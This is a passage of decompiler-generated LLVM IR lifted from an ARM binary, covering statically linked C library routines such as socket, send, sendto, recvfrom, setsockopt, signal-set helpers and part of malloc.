  %v6_12038 = load i32, i32* @r5, align 4
  %v9_12038 = load i32, i32* @r6, align 4
  %v12_12038 = load i32, i32* @r7, align 4
  %v15_12038 = load i32, i32* @r8, align 4
  %v18_12038 = load i32, i32* @sb, align 4
  %v21_12038 = load i32, i32* @sl, align 4
  %v24_12038 = load i32, i32* @lr, align 4
  %v4_12048 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_12050 = icmp eq i32 %v4_12048, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12050, label %dec_label_pc_12070, label %dec_label_pc_1207c

dec_label_pc_12070:                               ; preds = %entry
  store i32 %v3_12038, i32* @r4, align 4
  store i32 %v12_12038, i32* @r7, align 4
  store i32 %v15_12038, i32* @r8, align 4
  store i32 %v18_12038, i32* %sb.global-to-local, align 4
  %v0_12078 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %entry, %dec_label_pc_12070
  %v0_1207c = call i32 @__libc_enable_asynccancel()
  %v0_12080 = load i32, i32* @r7, align 4
  store i32 %v0_12080, i32* @r1, align 4
  store i32 %v0_1207c, i32* @r5, align 4
  %v0_12090 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12090, i32* @r0, align 4
  %v0_12098 = call i32 @__sys_recvfrom()
  store i32 %v0_12098, i32* @r4, align 4
  %v0_120a0 = load i32, i32* @r5, align 4
  %v1_120a4 = call i32 @__libc_disable_asynccancel(i32 %v0_120a0)
  %v0_120a8 = load i32, i32* @r4, align 4
  %v2_120b0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_120b0, i32* @r4, align 4
  store i32 %v6_12038, i32* @r5, align 4
  store i32 %v9_12038, i32* @r6, align 4
  store i32 %v12_12038, i32* @r7, align 4
  store i32 %v15_12038, i32* @r8, align 4
  store i32 %v18_12038, i32* @sb, align 4
  store i32 %v21_12038, i32* @sl, align 4
  store i32 %v24_12038, i32* @lr, align 4
  ret i32 %v0_120a8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1207c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_120c0 = load i32, i32* @r7, align 4
  store i32 %v3_120c0, i32* %stack_var_-8, align 4
  %v0_120cc = load i32, i32* @r0, align 4
  store i32 %v0_120cc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_120cc, -4095
  br i1 %tmp, label %dec_label_pc_120f4, label %dec_label_pc_120dc

dec_label_pc_120dc:                               ; preds = %entry
  %v0_120e0 = call i32 @__aeabi_read_tp()
  %v3_120e4 = load i16, i16* @global_var_2222c.358, align 2
  %v4_120e4 = sext i16 %v3_120e4 to i32
  store i32 %v4_120e4, i32* @r3, align 4
  %v0_120e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_120e8 = sub i32 0, %v0_120e8
  store i32 %v1_120e8, i32* %r2.global-to-local, align 4
  %v3_120ec = add i32 %v4_120e4, %v0_120e0
  %v4_120ec = inttoptr i32 %v3_120ec to i32*
  store i32 %v1_120e8, i32* %v4_120ec, align 4
  %v2_120f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_120f4

dec_label_pc_120f4:                               ; preds = %entry, %dec_label_pc_120dc
  %v1_120f8 = phi i32 [ %v0_120cc, %entry ], [ -1, %dec_label_pc_120dc ]
  %v2_120f4 = phi i32 [ %v3_120c0, %entry ], [ %v2_120f4.pre, %dec_label_pc_120dc ]
  store i32 %v2_120f4, i32* @r7, align 4
  ret i32 %v1_120f8

; uselistorder directives
  uselistorder i32 %v0_120cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120f4, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_120fc:
  %v0_120fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_120fc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_120fc
  %v5_120fc = udiv i32 %arg2, 4
  %v6_120fc = and i32 %v5_120fc, %arg1
  %v5_121002 = udiv i32 %v6_120fc, 4
  %v6_12100 = and i32 %v5_121002, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_120fc, %bb
  %v7_12100 = phi i32 [ %arg1, %dec_label_pc_120fc ], [ %v6_12100, %bb ]
  ret i32 %v7_12100

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12108 = load i32, i32* @r4, align 4
  store i32 %v3_12108, i32* %stack_var_-24, align 4
  %v6_12108 = load i32, i32* @r5, align 4
  %v9_12108 = load i32, i32* @r6, align 4
  %v12_12108 = load i32, i32* @r7, align 4
  %v15_12108 = load i32, i32* @r8, align 4
  %v18_12108 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @ip, align 4
  %v4_12114 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_12118 = icmp eq i32 %v4_12114, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12118, label %dec_label_pc_12130, label %entry.dec_label_pc_12138_crit_edge

entry.dec_label_pc_12138_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12138

dec_label_pc_12130:                               ; preds = %entry
  store i32 %v3_12108, i32* @r4, align 4
  store i32 %v9_12108, i32* @r6, align 4
  store i32 %v12_12108, i32* @r7, align 4
  store i32 %v15_12108, i32* @r8, align 4
  %v0_12134 = call i32 @__sys_send()
  br label %dec_label_pc_12138

dec_label_pc_12138:                               ; preds = %entry.dec_label_pc_12138_crit_edge, %dec_label_pc_12130
  %v0_12138 = call i32 @__libc_enable_asynccancel()
  %v0_1213c = load i32, i32* @r6, align 4
  store i32 %v0_1213c, i32* @r1, align 4
  store i32 %v0_12138, i32* @r5, align 4
  %v0_12148 = load i32, i32* @r8, align 4
  store i32 %v0_12148, i32* @r3, align 4
  %v0_1214c = load i32, i32* @r4, align 4
  store i32 %v0_1214c, i32* @r0, align 4
  %v0_12150 = call i32 @__sys_send()
  store i32 %v0_12150, i32* @r4, align 4
  %v0_12158 = load i32, i32* @r5, align 4
  %v1_1215c = call i32 @__libc_disable_asynccancel(i32 %v0_12158)
  %v0_12160 = load i32, i32* @r4, align 4
  %v2_12164 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12164, i32* @r4, align 4
  store i32 %v6_12108, i32* @r5, align 4
  store i32 %v9_12108, i32* @r6, align 4
  store i32 %v12_12108, i32* @r7, align 4
  store i32 %v15_12108, i32* @r8, align 4
  store i32 %v18_12108, i32* @lr, align 4
  ret i32 %v0_12160

; uselistorder directives
  uselistorder label %dec_label_pc_12138, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12174 = load i32, i32* @r4, align 4
  store i32 %v3_12174, i32* %stack_var_-16, align 4
  %v0_12188 = load i32, i32* @r0, align 4
  store i32 %v0_12188, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12188, -4095
  br i1 %tmp, label %dec_label_pc_121b0, label %dec_label_pc_12198

dec_label_pc_12198:                               ; preds = %entry
  %v0_1219c = call i32 @__aeabi_read_tp()
  %v3_121a0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_121a0 = sext i16 %v3_121a0 to i32
  %v0_121a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_121a4 = sub i32 0, %v0_121a4
  store i32 %v1_121a4, i32* %r2.global-to-local, align 4
  %v3_121a8 = add i32 %v4_121a0, %v0_1219c
  %v4_121a8 = inttoptr i32 %v3_121a8 to i32*
  store i32 %v1_121a4, i32* %v4_121a8, align 4
  %v2_121b0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_121b0

dec_label_pc_121b0:                               ; preds = %entry, %dec_label_pc_12198
  %v1_121b4 = phi i32 [ %v0_12188, %entry ], [ -1, %dec_label_pc_12198 ]
  %v2_121b0 = phi i32 [ %v3_12174, %entry ], [ %v2_121b0.pre, %dec_label_pc_12198 ]
  store i32 %v2_121b0, i32* @r4, align 4
  ret i32 %v1_121b4

; uselistorder directives
  uselistorder i32 %v0_12188, { 1, 0, 2 }
  uselistorder label %dec_label_pc_121b0, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_121b8:
  %v0_121b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_121b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_121b8
  %v2_121bc = load i32, i32* @r4, align 4
  %v4_121bc = mul i32 %v2_121bc, 2
  %v5_121bc = and i32 %v4_121bc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_121b8, %bb
  %v6_121bc = phi i32 [ %arg1, %dec_label_pc_121b8 ], [ %v5_121bc, %bb ]
  ret i32 %v6_121bc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_121c0 = load i32, i32* @r4, align 4
  store i32 %v3_121c0, i32* %stack_var_-32, align 4
  %v6_121c0 = load i32, i32* @r5, align 4
  %v9_121c0 = load i32, i32* @r6, align 4
  %v12_121c0 = load i32, i32* @r7, align 4
  %v15_121c0 = load i32, i32* @r8, align 4
  %v18_121c0 = load i32, i32* @sb, align 4
  %v21_121c0 = load i32, i32* @sl, align 4
  %v24_121c0 = load i32, i32* @lr, align 4
  %v4_121d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_121d8 = icmp eq i32 %v4_121d0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_121d8, label %dec_label_pc_121f8, label %dec_label_pc_12204

dec_label_pc_121f8:                               ; preds = %entry
  store i32 %v3_121c0, i32* @r4, align 4
  store i32 %v12_121c0, i32* @r7, align 4
  store i32 %v15_121c0, i32* @r8, align 4
  store i32 %v18_121c0, i32* %sb.global-to-local, align 4
  %v0_12200 = call i32 @__sys_sendto()
  br label %dec_label_pc_12204

dec_label_pc_12204:                               ; preds = %entry, %dec_label_pc_121f8
  %v0_12204 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12204, i32* @r5, align 4
  %v0_12218 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12218, i32* @r0, align 4
  %v0_12220 = call i32 @__sys_sendto()
  store i32 %v0_12220, i32* @r4, align 4
  %v0_12228 = load i32, i32* @r5, align 4
  %v1_1222c = call i32 @__libc_disable_asynccancel(i32 %v0_12228)
  %v0_12230 = load i32, i32* @r4, align 4
  %v2_12238 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12238, i32* @r4, align 4
  store i32 %v6_121c0, i32* @r5, align 4
  store i32 %v9_121c0, i32* @r6, align 4
  store i32 %v12_121c0, i32* @r7, align 4
  store i32 %v15_121c0, i32* @r8, align 4
  store i32 %v18_121c0, i32* @sb, align 4
  store i32 %v21_121c0, i32* @sl, align 4
  store i32 %v24_121c0, i32* @lr, align 4
  ret i32 %v0_12230

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12204, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12248 = load i32, i32* @r4, align 4
  store i32 %v3_12248, i32* %stack_var_-12, align 4
  %v0_12258 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12258, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12258, -4095
  br i1 %tmp, label %dec_label_pc_12280, label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %entry
  %v0_1226c = call i32 @__aeabi_read_tp()
  %v3_12270 = load i16, i16* @global_var_2222c.358, align 2
  %v4_12270 = sext i16 %v3_12270 to i32
  store i32 %v4_12270, i32* @r3, align 4
  %v0_12274 = load i32, i32* %r2.global-to-local, align 4
  %v1_12274 = sub i32 0, %v0_12274
  store i32 %v1_12274, i32* %r2.global-to-local, align 4
  %v3_12278 = add i32 %v4_12270, %v0_1226c
  %v4_12278 = inttoptr i32 %v3_12278 to i32*
  store i32 %v1_12274, i32* %v4_12278, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12280.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12280

dec_label_pc_12280:                               ; preds = %entry, %dec_label_pc_12268
  %v1_12284 = phi i32 [ %v0_12258, %entry ], [ -1, %dec_label_pc_12268 ]
  %v2_12280 = phi i32 [ %v3_12248, %entry ], [ %v2_12280.pre, %dec_label_pc_12268 ]
  store i32 %v2_12280, i32* @r4, align 4
  ret i32 %v1_12284

; uselistorder directives
  uselistorder i32 %v0_12258, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12280, { 1, 0 }
}

define i32 @"$d.1"(i16* %arg1) local_unnamed_addr {
dec_label_pc_12288:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_12288 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12288, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12288
  %v2_12288 = load i32, i32* @r6, align 4
  %v5_12288 = udiv i32 %v2_12288, 4
  %v6_12288 = and i32 %v5_12288, %tmp
  store i32 %v6_12288, i32* %r0.global-to-local, align 4
  %v2_1228c = inttoptr i32 %v6_12288 to i16*
  store i16 8852, i16* %v2_1228c, align 2
  %v3_1228c = load i32, i32* @r4, align 4
  %v4_1228c = load i32, i32* %r0.global-to-local, align 4
  %v5_1228c = sub i32 %v4_1228c, %v3_1228c
  store i32 %v5_1228c, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12288, %bb
  %v6_1228c = phi i32 [ %tmp, %dec_label_pc_12288 ], [ %v5_1228c, %bb ]
  ret i32 %v6_1228c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12290 = load i32, i32* @r7, align 4
  store i32 %v3_12290, i32* %stack_var_-8, align 4
  %v0_1229c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1229c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1229c, -4095
  br i1 %tmp, label %dec_label_pc_122c4, label %dec_label_pc_122ac

dec_label_pc_122ac:                               ; preds = %entry
  %v0_122b0 = call i32 @__aeabi_read_tp()
  %v3_122b4 = load i16, i16* @global_var_2222c.358, align 2
  %v4_122b4 = sext i16 %v3_122b4 to i32
  store i32 %v4_122b4, i32* @r3, align 4
  %v0_122b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_122b8 = sub i32 0, %v0_122b8
  store i32 %v1_122b8, i32* %r2.global-to-local, align 4
  %v3_122bc = add i32 %v4_122b4, %v0_122b0
  %v4_122bc = inttoptr i32 %v3_122bc to i32*
  store i32 %v1_122b8, i32* %v4_122bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_122c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_122c4

dec_label_pc_122c4:                               ; preds = %entry, %dec_label_pc_122ac
  %v1_122c8 = phi i32 [ %v0_1229c, %entry ], [ -1, %dec_label_pc_122ac ]
  %v2_122c4 = phi i32 [ %v3_12290, %entry ], [ %v2_122c4.pre, %dec_label_pc_122ac ]
  store i32 %v2_122c4, i32* @r7, align 4
  ret i32 %v1_122c8

; uselistorder directives
  uselistorder i32 %v0_1229c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122c4, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_122cc:
  %v0_122cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_122cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_122cc
  %v3_122d0 = call i32 @__libc_errno()
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_122cc, %bb
  %v4_122d0 = phi i32 [ %arg1, %dec_label_pc_122cc ], [ %v3_122d0, %bb ]
  ret i32 %v4_122d0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_122ec, label %dec_label_pc_122e4

dec_label_pc_122e4:                               ; preds = %entry
  %v7_122e8 = icmp slt i32 %arg2, 65
  br i1 %v7_122e8, label %dec_label_pc_12308, label %dec_label_pc_122ec

dec_label_pc_122ec:                               ; preds = %dec_label_pc_122e4, %entry
  %v0_122f0 = call i32 @__aeabi_read_tp()
  %v3_122f4 = load i16, i16* @global_var_2222c.358, align 2
  %v4_122f4 = sext i16 %v3_122f4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12300 = add i32 %v4_122f4, %v0_122f0
  %v4_12300 = inttoptr i32 %v3_12300 to i32*
  store i32 22, i32* %v4_12300, align 4
  %v0_12310.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12310

dec_label_pc_12308:                               ; preds = %dec_label_pc_122e4
  %v0_12308 = call i32 @__sigaddset()
  store i32 %v0_12308, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12310

dec_label_pc_12310:                               ; preds = %dec_label_pc_122ec, %dec_label_pc_12308
  %v0_12310 = phi i32 [ %v0_12310.pre, %dec_label_pc_122ec ], [ %v0_12308, %dec_label_pc_12308 ]
  ret i32 %v0_12310

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12310, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1232c = add i32 %tmp, 4
  %v3_1232c = inttoptr i32 %v2_1232c to i32*
  store i32 0, i32* %v3_1232c, align 4
  %v1_12330 = load i32, i32* %r3.global-to-local, align 4
  %v2_12330 = inttoptr i32 %v1_12330 to i32*
  store i32 0, i32* %v2_12330, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12338 = load i32, i32* @r4, align 4
  store i32 %v3_12338, i32* %stack_var_-16, align 4
  %v6_12338 = load i32, i32* @r5, align 4
  %v9_12338 = load i32, i32* @r6, align 4
  %v7_12340 = icmp eq i32 %arg2, -1
  br i1 %v7_12340, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_12348 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_12364

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_1236c

dec_label_pc_12364:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r6, align 4
  %v7_12368 = icmp slt i32 %arg1, 65
  br i1 %v7_12368, label %dec_label_pc_12388, label %dec_label_pc_1236c

dec_label_pc_1236c:                               ; preds = %.thread16, %dec_label_pc_12364
  %v0_12370 = call i32 @__aeabi_read_tp()
  %v3_12374 = load i16, i16* @global_var_2222c.358, align 2
  %v4_12374 = sext i16 %v3_12374 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12380 = add i32 %v4_12374, %v0_12370
  %v4_12380 = inttoptr i32 %v3_12380 to i32*
  store i32 22, i32* %v4_12380, align 4
  %v0_123e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_12388:                               ; preds = %dec_label_pc_12364
  %v2_12388 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12388, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_12390 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_12390, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_123a0 = call i32 @__sigaddset()
  %v0_123a8 = load i32, i32* @r5, align 4
  store i32 %v0_123a8, i32* %r1.global-to-local, align 4
  %v0_123ac = load i32, i32* @r6, align 4
  %v2_123ac = add i32 %v0_123ac, 11920
  %v2_123b0 = call i32 @__GI___sigismember(i32 %v2_123ac, i32 %v0_123a8)
  store i32 %v2_12388, i32* %r1.global-to-local, align 4
  %v0_123c4 = load i32, i32* @r5, align 4
  %v3_123d0 = call i32 @__libc_sigaction(i32 %v0_123c4, i32 %v2_12388, i32 %v2_12348)
  %v1_123d4 = icmp slt i32 %v3_123d0, 0
  br i1 %v1_123d4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_12388
  %v5_123d8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_123d8, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_12388
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1236c, %bb32
  %v0_123e0 = phi i32 [ %v5_123d8, %bb31 ], [ %v0_123e0.pre, %dec_label_pc_1236c ], [ -1, %bb32 ]
  %v2_123e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_123e8, i32* @r4, align 4
  store i32 %v6_12338, i32* @r5, align 4
  store i32 %v9_12338, i32* @r6, align 4
  ret i32 %v0_123e0

; uselistorder directives
  uselistorder i32 %v2_12388, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1236c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_123fc = add i32 %arg2, -1
  %v3_12400 = udiv i32 %v1_123fc, 32
  %v4_12404 = mul nuw nsw i32 %v3_12400, 4
  %v5_12404 = add i32 %v4_12404, %arg1
  %v6_12404 = inttoptr i32 %v5_12404 to i32*
  %v7_12404 = load i32, i32* %v6_12404, align 4
  %v1_12408 = urem i32 %v1_123fc, 32
  %v7_12410 = shl i32 1, %v1_12408
  %v8_12410 = and i32 %v7_12404, %v7_12410
  %v10_12410 = icmp ne i32 %v8_12410, 0
  %. = zext i1 %v10_12410 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_123fc, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_12420 = load i32, i32* @r1, align 4
  %v1_12420 = add i32 %v0_12420, -1
  %v3_12424 = udiv i32 %v1_12420, 32
  %v0_12428 = load i32, i32* @r0, align 4
  %v4_12428 = mul nuw nsw i32 %v3_12424, 4
  %v5_12428 = add i32 %v0_12428, %v4_12428
  %v6_12428 = inttoptr i32 %v5_12428 to i32*
  %v7_12428 = load i32, i32* %v6_12428, align 4
  %v1_1242c = urem i32 %v1_12420, 32
  %v7_12434 = shl i32 1, %v1_1242c
  %v8_12434 = or i32 %v7_12428, %v7_12434
  store i32 %v8_12434, i32* %v6_12428, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12420, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12444 = add i32 %arg2, -1
  %v3_12448 = udiv i32 %v1_12444, 32
  %v4_1244c = mul nuw nsw i32 %v3_12448, 4
  %v5_1244c = add i32 %v4_1244c, %arg1
  %v6_1244c = inttoptr i32 %v5_1244c to i32*
  %v7_1244c = load i32, i32* %v6_1244c, align 4
  %v1_12450 = urem i32 %v1_12444, 32
  %tmp = shl i32 -1, %v1_12450
  %v8_12458 = add i32 %tmp, -1
  %v9_12458 = and i32 %v7_1244c, %v8_12458
  store i32 %v9_12458, i32* %v6_1244c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12444, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_12468 = udiv i32 %arg1, 256
  store i32 %v3_12468, i32* %r1.global-to-local, align 4
  %v2_1246c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_1246c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_12478 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1246c, i32 %v0_12478)
  %v0_1247c = load i32, i32* %r1.global-to-local, align 4
  %v1_1247c = add i32 %v0_1247c, 1048320
  %v3_12480 = udiv i32 %v1_1247c, 65536
  %v1_12484 = and i32 %v3_12480, 8
  %v6_12488 = shl i32 %v0_1247c, %v1_12484
  %v1_1248c = add i32 %v6_12488, 520192
  %v3_12490 = udiv i32 %v1_1248c, 65536
  %v1_12494 = and i32 %v3_12490, 4
  %v6_12498 = shl i32 %v6_12488, %v1_12494
  %v1_1249c = add i32 %v6_12498, 245760
  %v3_124a0 = udiv i32 %v1_1249c, 65536
  %v1_124a4 = and i32 %v3_124a0, 2
  %v6_124a8 = shl i32 %v6_12498, %v1_124a4
  store i32 %v6_124a8, i32* %r1.global-to-local, align 4
  %v1_124ac = sub nsw i32 13, %v1_12484
  %v2_124b0 = sub nsw i32 %v1_124ac, %v1_12494
  %v3_124b4 = udiv i32 %v6_124a8, 32768
  %v4_124b4 = sub nuw nsw i32 -1, %v3_124b4
  %v4_124b8 = udiv i32 %v6_124a8, 16384
  %v5_124b8 = and i32 %v4_124b8, %v4_124b4
  %v2_124bc = sub nsw i32 %v2_124b0, %v1_124a4
  %v2_124c0 = add nsw i32 %v2_124bc, %v5_124b8
  %v1_124c4 = add nsw i32 %v2_124c0, 6
  %v0_124c8 = load i32, i32* %ip.global-to-local, align 4
  %v6_124c8 = lshr i32 %v0_124c8, %v1_124c4
  %v3_124cc = mul nsw i32 %v2_124c0, 4
  %v1_124d0 = add nsw i32 %v3_124cc, 32
  %v1_124d4 = urem i32 %v6_124c8, 4
  %v2_124d8 = or i32 %v1_124d4, %v1_124d0
  ret i32 %v2_124d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_124e0 = load i32, i32* @r4, align 4
  %v6_124e0 = load i32, i32* @r5, align 4
  %v9_124e0 = load i32, i32* @r6, align 4
  %v12_124e0 = load i32, i32* @r7, align 4
  %v15_124e0 = load i32, i32* @r8, align 4
